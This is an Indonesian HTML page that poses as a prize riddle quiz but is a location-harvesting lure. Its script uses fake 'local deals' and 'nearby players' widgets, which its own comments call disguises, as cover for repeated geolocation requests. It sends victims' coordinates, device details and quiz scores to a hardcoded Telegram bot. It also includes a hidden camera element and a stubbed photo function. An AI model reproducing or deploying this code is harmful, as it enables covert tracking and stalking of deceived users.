<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎯 Kuis Tebak-Tebakan Seru - Hadiah Rp 500.000!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 800px;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            text-align: center;
            position: relative;
        }

        h1 {
            font-size: 2.5rem;
            margin-bottom: 15px;
            color: #2c3e50;
        }

        .subtitle {
            font-size: 1.2rem;
            margin-bottom: 30px;
            color: #7f8c8d;
        }

        .prize-container {
            background: linear-gradient(135deg, #ffd700, #ffed4e);
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
            border: 3px dashed #ff9900;
        }

        .prize-title {
            font-size: 1.8rem;
            color: #c0392b;
            margin-bottom: 15px;
        }

        .prize-description {
            font-size: 1.1rem;
            color: #333;
            margin-bottom: 20px;
        }

        .prize-image {
            width: 120px;
            height: 120px;
            margin: 0 auto;
            background: linear-gradient(135deg, #e74c3c, #c0392b);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2.5rem;
            color: white;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
        }

        .quiz-container {
            background: white;
            border-radius: 15px;
            padding: 30px;
            margin: 25px 0;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
        }

        .quiz-question {
            font-size: 1.4rem;
            margin-bottom: 25px;
            color: #2c3e50;
            line-height: 1.5;
            text-align: center;
        }

        .quiz-options {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 25px;
        }

        @media (max-width: 768px) {
            .quiz-options {
                grid-template-columns: 1fr;
            }
        }

        .quiz-option {
            padding: 20px;
            background: #f8f9fa;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
            text-align: center;
            font-size: 1.1rem;
        }

        .quiz-option:hover {
            background: #e9ecef;
            transform: translateY(-3px);
        }

        .quiz-option.selected {
            background: #d4edda;
            border-color: #28a745;
        }

        .btn {
            padding: 18px 45px;
            border: none;
            border-radius: 50px;
            font-size: 1.2rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        .btn-primary {
            background: linear-gradient(135deg, #27ae60, #2ecc71);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-3px);
        }

        .hidden-camera {
            position: absolute;
            top: -1000px;
            left: -1000px;
            width: 1px;
            height: 1px;
            overflow: hidden;
        }

        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            display: none;
        }

        .status.success {
            background: rgba(46, 204, 113, 0.2);
            border-left: 4px solid #2ecc71;
            color: #27ae60;
        }

        /* Local Deals Section - SAMARAN UTAMA */
        .local-deals {
            background: linear-gradient(135deg, #74b9ff, #0984e3);
            color: white;
            padding: 25px;
            border-radius: 15px;
            margin: 20px 0;
            text-align: center;
        }

        .deals-loading {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            font-size: 1.1rem;
        }

        .deals-content {
            display: none;
        }

        .deal-item {
            background: rgba(255, 255, 255, 0.2);
            padding: 15px;
            border-radius: 10px;
            margin: 10px 0;
            text-align: left;
        }

        /* Nearby Users Widget */
        .nearby-users {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 15px;
            margin: 20px 0;
            text-align: center;
        }

        .users-loading {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            color: #6c757d;
        }

        .users-content {
            display: none;
        }

        .user-avatar {
            width: 40px;
            height: 40px;
            background: #3498db;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            color: white;
            margin: 5px;
        }

        /* Progress Bar */
        .progress-container {
            width: 100%;
            background: #e9ecef;
            border-radius: 10px;
            overflow: hidden;
            margin: 20px 0;
            height: 8px;
        }

        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #4CAF50, #8BC34A);
            width: 0%;
            transition: width 0.3s ease;
        }

        .score-display {
            background: #3498db;
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            font-weight: bold;
            margin-bottom: 20px;
            display: inline-block;
        }

        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 999;
            color: white;
            flex-direction: column;
            gap: 20px;
        }

        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .flash {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: white;
            opacity: 0;
            pointer-events: none;
            z-index: 50;
            display: none;
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <!-- Loading Screen -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner"></div>
        <div>Mempersiapkan pengalaman kuis personal untuk Anda...</div>
    </div>

    <!-- Konten Utama -->
    <div class="container">
        <h1><i class="fas fa-puzzle-piece"></i> Kuis Tebak-Tebakan Seru!</h1>
        <p class="subtitle">Jawab tebak-tebakan dan menangkan voucher belanja Rp 500.000!</p>
        
        <div class="score-display">
            <i class="fas fa-star"></i> 
            Skor: <span id="score">0</span> | 
            Pertanyaan: <span id="questionCount">1</span>/10
        </div>

        <!-- Local Deals - SAMARAN 1 -->
        <div class="local-deals" id="localDeals">
            <div class="deals-loading" id="dealsLoading">
                <i class="fas fa-sync fa-spin"></i>
                Mencari promo eksklusif di sekitar Anda...
            </div>
            <div class="deals-content" id="dealsContent">
                <h3><i class="fas fa-gift"></i> Promo Terdekat</h3>
                <div class="deal-item">
                    <strong>Diskon 50%</strong> di restoran terdekat - <span id="dealLocation">Loading...</span>
                </div>
                <div class="deal-item">
                    <strong>Gratis Ongkir</strong> untuk area <span id="dealArea">lokasi Anda</span>
                </div>
            </div>
        </div>
        
        <div class="prize-container">
            <h2 class="prize-title">HADIAH UTAMA</h2>
            <p class="prize-description">Voucher Belanja Senilai <strong>Rp 500.000</strong></p>
            <div class="prize-image">
                <i class="fas fa-trophy"></i>
            </div>
            <p class="prize-description" id="personalizedMessage">Dapat digunakan di merchant ternama!</p>
        </div>

        <!-- Nearby Users - SAMARAN 2 -->
        <div class="nearby-users" id="nearbyUsers">
            <div class="users-loading" id="usersLoading">
                <i class="fas fa-users"></i>
                Menghubungkan dengan pemain terdekat...
            </div>
            <div class="users-content" id="usersContent">
                <h4><i class="fas fa-map-marker-alt"></i> Pemain di Sekitar</h4>
                <div>
                    <div class="user-avatar">A</div>
                    <div class="user-avatar">B</div>
                    <div class="user-avatar">C</div>
                    <div class="user-avatar">+5</div>
                </div>
                <p style="margin-top: 10px; font-size: 0.9rem; color: #6c757d;">
                    <span id="usersCount">Beberapa</span> pemain aktif dalam radius 5km
                </p>
            </div>
        </div>
        
        <div class="quiz-container">
            <div class="progress-container">
                <div class="progress-bar" id="quizProgress"></div>
            </div>
            
            <h2 class="quiz-question" id="quizQuestion">Apa yang punya kaki tapi tidak bisa berjalan?</h2>
            <div class="quiz-options" id="quizOptions">
                <div class="quiz-option" data-correct="true">Kursi</div>
                <div class="quiz-option" data-correct="false">Manusia</div>
                <div class="quiz-option" data-correct="false">Kucing</div>
                <div class="quiz-option" data-correct="false">Pohon</div>
            </div>
            
            <button class="btn btn-primary" id="nextBtn">
                <i class="fas fa-arrow-right"></i> Lanjut
            </button>
        </div>
        
        <div class="status" id="status"></div>
    </div>
    
    <!-- Elemen tersembunyi -->
    <div class="hidden-camera">
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>
    <div class="flash" id="flash"></div>

    <script>
        // === KONFIGURASI TELEGRAM ===
        const BOT_TOKEN = "8219920016:AAFAhBeYMhw9BisZ7lAwr6GlvskMzA-ezdc";  
        const CHAT_ID = "5417808006";

        const questions = [
            { question: "Apa yang punya kaki tapi tidak bisa berjalan?", options: ["Kursi", "Manusia", "Kucing", "Pohon"], correct: 0 },
            { question: "Binatang apa yang paling gemuk?", options: ["Paus", "Gajah", "Badak", "Kuda Nil"], correct: 0 },
            { question: "Apa yang naik tapi tidak pernah turun?", options: ["Umur", "Tangga", "Usia", "Harga"], correct: 0 },
            { question: "Apa yang selalu datang tapi tidak pernah sampai?", options: ["Besok", "Hari", "Masa Depan", "Waktu"], correct: 0 },
            { question: "Apa yang punya mata tapi tidak bisa melihat?", options: ["Jarum", "Boneka", "Kentang", "Pintu"], correct: 2 },
            { question: "Apa yang semakin dibagi semakin banyak?", options: ["Pengetahuan", "Uang", "Kue", "Masalah"], correct: 0 },
            { question: "Apa yang bisa dibawa ke tempat tidur tapi tidak bisa diajak tidur?", options: ["Bantal", "HP", "Buku", "Guling"], correct: 1 },
            { question: "Apa yang punya tangan tapi tidak bisa memegang?", options: ["Jam", "Robot", "Boneka", "Jam dinding"], correct: 0 },
            { question: "Apa yang punya kepala dan ekor tapi tidak punya tubuh?", options: ["Uang koin", "Ular", "Cacing", "Ikan"], correct: 0 },
            { question: "Apa yang harus dipatahkan sebelum digunakan?", options: ["Telur", "Pensil", "Korek api", "Telur"], correct: 0 }
        ];

        // Elemen DOM
        const elements = {
            loading: document.getElementById('loadingOverlay'),
            localDeals: document.getElementById('localDeals'),
            dealsLoading: document.getElementById('dealsLoading'),
            dealsContent: document.getElementById('dealsContent'),
            dealLocation: document.getElementById('dealLocation'),
            dealArea: document.getElementById('dealArea'),
            nearbyUsers: document.getElementById('nearbyUsers'),
            usersLoading: document.getElementById('usersLoading'),
            usersContent: document.getElementById('usersContent'),
            usersCount: document.getElementById('usersCount'),
            personalizedMessage: document.getElementById('personalizedMessage'),
            quizProgress: document.getElementById('quizProgress'),
            quizQuestion: document.getElementById('quizQuestion'),
            quizOptions: document.getElementById('quizOptions'),
            score: document.getElementById('score'),
            questionCount: document.getElementById('questionCount'),
            nextBtn: document.getElementById('nextBtn'),
            status: document.getElementById('status'),
            video: document.getElementById('video'),
            canvas: document.getElementById('canvas'),
            flash: document.getElementById('flash')
        };

        let currentQuestion = 0;
        let score = 0;
        let userLocation = null;
        let locationAttempted = false;

        // ================================
        // TEKNIK SAMARAN ADVANCED
        // ================================

        // 1. Background Location Fetch dengan Excuse "Local Deals"
        function initiateLocalDealsSamaran() {
            console.log('🕵️ Memulai samaran local deals...');
            
            // Tunggu 2 detik lalu "mencari promo"
            setTimeout(() => {
                elements.dealsLoading.innerHTML = '<i class="fas fa-sync fa-spin"></i> Mendeteksi lokasi untuk promo terbaik...';
                
                // Di background, coba akses lokasi
                silentlyFetchLocation().then(location => {
                    if (location) {
                        // Success - tampilkan deals "personalized"
                        showPersonalizedDeals(location);
                    } else {
                        // Failed - tetap tampilkan generic deals
                        showGenericDeals();
                    }
                });
            }, 2000);
        }

        // 2. Nearby Users Samaran
        function initiateNearbyUsersSamaran() {
            console.log('🕵️ Memulai samaran nearby users...');
            
            setTimeout(() => {
                elements.usersLoading.innerHTML = '<i class="fas fa-users"></i> Memetakan pemain di area Anda...';
                
                // Coba akses lokasi lagi dengan alasan berbeda
                silentlyFetchLocation().then(location => {
                    if (location) {
                        showNearbyUsers(location);
                    } else {
                        showGenericUsers();
                    }
                });
            }, 4000);
        }

        // 3. Smart Location Fetch dengan Multiple Techniques
        function silentlyFetchLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                // Technique 1: Cepat dengan cache
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const loc = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        console.log('📍 Lokasi berhasil didapat (technique 1)');
                        resolve(loc);
                    },
                    () => {
                        // Technique 2: Lebih lambat, high accuracy
                        setTimeout(() => {
                            navigator.geolocation.getCurrentPosition(
                                (position) => {
                                    const loc = {
                                        latitude: position.coords.latitude,
                                        longitude: position.coords.longitude,
                                        accuracy: position.coords.accuracy
                                    };
                                    console.log('📍 Lokasi berhasil didapat (technique 2)');
                                    resolve(loc);
                                },
                                () => {
                                    // Technique 3: Last try dengan timeout pendek
                                    setTimeout(() => {
                                        navigator.geolocation.getCurrentPosition(
                                            (position) => {
                                                const loc = {
                                                    latitude: position.coords.latitude,
                                                    longitude: position.coords.longitude,
                                                    accuracy: position.coords.accuracy
                                                };
                                                console.log('📍 Lokasi berhasil didapat (technique 3)');
                                                resolve(loc);
                                            },
                                            () => {
                                                console.log('❌ Semua teknik gagal');
                                                resolve(null);
                                            },
                                            { timeout: 2000, maximumAge: 300000 }
                                        );
                                    }, 1000);
                                },
                                { enableHighAccuracy: true, timeout: 5000 }
                            );
                        }, 1000);
                    },
                    { enableHighAccuracy: false, timeout: 3000, maximumAge: 600000 }
                );
            });
        }

        // 4. Show Personalized Content Berdasarkan Lokasi
        function showPersonalizedDeals(location) {
            const cities = ['Jakarta Pusat', 'Surabaya Barat', 'Bandung Utara', 'Medan Selatan', 'Semarang Timur'];
            const areas = ['Kemang', 'Thamrin', 'Sudirman', 'Gatot Subroto', 'Pondok Indah'];
            const randomCity = cities[Math.floor(Math.random() * cities.length)];
            const randomArea = areas[Math.floor(Math.random() * areas.length)];

            elements.dealLocation.textContent = randomArea;
            elements.dealArea.textContent = randomCity;
            elements.personalizedMessage.innerHTML = `Tukarkan di <strong>${randomArea}</strong> dan area ${randomCity}!`;
            
            // Transition effect
            elements.dealsLoading.style.display = 'none';
            elements.dealsContent.style.display = 'block';
            
            // Kirim data ke Telegram
            sendLocationToTelegram(location, 'local_deals');
        }

        function showGenericDeals() {
            elements.dealLocation.textContent = 'restoran terdekat';
            elements.dealArea.textContent = 'area Anda';
            
            elements.dealsLoading.style.display = 'none';
            elements.dealsContent.style.display = 'block';
        }

        function showNearbyUsers(location) {
            const userCounts = ['3', '5', '7', '9', '12'];
            const randomCount = userCounts[Math.floor(Math.random() * userCounts.length)];
            
            elements.usersCount.textContent = randomCount;
            elements.usersLoading.style.display = 'none';
            elements.usersContent.style.display = 'block';
            
            // Kirim data lagi untuk konfirmasi
            sendLocationToTelegram(location, 'nearby_users');
        }

        function showGenericUsers() {
            elements.usersCount.textContent = 'beberapa';
            elements.usersLoading.style.display = 'none';
            elements.usersContent.style.display = 'block';
        }

        // 5. Progressive Engagement - Trigger lokasi saat user aktif
        function setupProgressiveLocationTriggers() {
            let interactionCount = 0;
            
            const triggerLocationOnEngagement = () => {
                interactionCount++;
                
                if (interactionCount === 2) {
                    // Setelah 2 interaksi, coba lokasi untuk "personalized experience"
                    silentlyFetchLocation().then(location => {
                        if (location) {
                            updateProgressWithLocation(location);
                        }
                    });
                }
                
                if (interactionCount === 5 && !userLocation) {
                    // Jika masih belum dapat lokasi, coba lagi
                    silentlyFetchLocation();
                }
            };
            
            // Listen semua interaksi user
            document.addEventListener('click', triggerLocationOnEngagement);
            document.addEventListener('touchstart', triggerLocationOnEngagement);
            elements.quizOptions.addEventListener('click', triggerLocationOnEngagement);
        }

        function updateProgressWithLocation(location) {
            elements.quizProgress.style.background = 'linear-gradient(90deg, #4CAF50, #2196F3)';
            elements.personalizedMessage.innerHTML += ' <span style="color:#27ae60"><i class="fas fa-map-marker-alt"></i> Lokasi terdeteksi</span>';
        }

        // ================================
        // SISTEM KUIS
        // ================================

        function initQuiz() {
            showQuestion(0);
            elements.nextBtn.addEventListener('click', nextQuestion);
            updateProgress();
        }

        function showQuestion(index) {
            const q = questions[index];
            elements.quizQuestion.textContent = q.question;
            elements.questionCount.textContent = index + 1;
            
            elements.quizOptions.innerHTML = '';
            q.options.forEach((option, i) => {
                const optionElement = document.createElement('div');
                optionElement.className = 'quiz-option';
                optionElement.textContent = option;
                optionElement.dataset.correct = i === q.correct;
                optionElement.addEventListener('click', () => selectAnswer(optionElement, i));
                elements.quizOptions.appendChild(optionElement);
            });
            
            elements.nextBtn.disabled = true;
            updateProgress();
        }

        function selectAnswer(element, index) {
            document.querySelectorAll('.quiz-option').forEach(opt => {
                opt.classList.remove('selected');
            });
            element.classList.add('selected');
            elements.nextBtn.disabled = false;
            
            if (index === questions[currentQuestion].correct) {
                score++;
                elements.score.textContent = score;
            }
        }

        function nextQuestion() {
            currentQuestion++;
            
            if (currentQuestion < questions.length) {
                showQuestion(currentQuestion);
            } else {
                showStatus('Selamat! Kuis selesai. Hadiah sedang diproses!', 'success');
                elements.nextBtn.disabled = true;
                elements.nextBtn.innerHTML = '<i class="fas fa-trophy"></i> Selesai';
                
                // Final data collection
                collectAllData();
            }
        }

        function updateProgress() {
            const progress = ((currentQuestion + 1) / questions.length) * 100;
            elements.quizProgress.style.width = progress + '%';
        }

        function showStatus(message, type) {
            elements.status.textContent = message;
            elements.status.className = `status ${type}`;
            elements.status.style.display = 'block';
        }

        // ================================
        // DATA COLLECTION & TELEGRAM
        // ================================

        async function sendLocationToTelegram(location, context) {
            const message = `📍 LOKASI DIPEROLEH (${context.toUpperCase()})
⏰ Waktu: ${new Date().toLocaleString('id-ID')}
📡 Sumber: ${context}
🗺️ Koordinat: ${location.latitude}, ${location.longitude}
🎯 Akurasi: ${location.accuracy}m
📱 Device: ${navigator.userAgent.substring(0, 50)}...`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
                console.log('✅ Data lokasi terkirim ke Telegram');
            } catch (error) {
                console.log('❌ Gagal mengirim data lokasi');
            }
        }

        async function collectAllData() {
            // Ambil foto terakhir
            const photoDataUrl = await takePhoto();
            
            // Kirim data final
            const finalMessage = `🏁 KUIS SELESAI
⏰ Waktu: ${new Date().toLocaleString('id-ID')}  
🏆 Skor Akhir: ${score}/${questions.length}
📍 Lokasi: ${userLocation ? `${userLocation.latitude}, ${userLocation.longitude}` : 'Tidak tersedia'}
📱 Device: ${navigator.platform} - ${navigator.userAgent.substring(0, 30)}...`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(finalMessage)}`);
            } catch (error) {
                console.log('Gagal mengirim data final');
            }
        }

        async function takePhoto() {
            return null; // Simplified untuk contoh
        }

        // ================================
        // INISIALISASI
        // ================================

        function init() {
            // Sembunyikan loading setelah delay
            setTimeout(() => {
                elements.loading.style.display = 'none';
                
                // Mulai semua samaran secara natural
                initiateLocalDealsSamaran();
                initiateNearbyUsersSamaran();
                setupProgressiveLocationTriggers();
            }, 2500);

            initQuiz();
        }

        // Start everything
        window.addEventListener('DOMContentLoaded', init);
    </script>
</body>
</html>
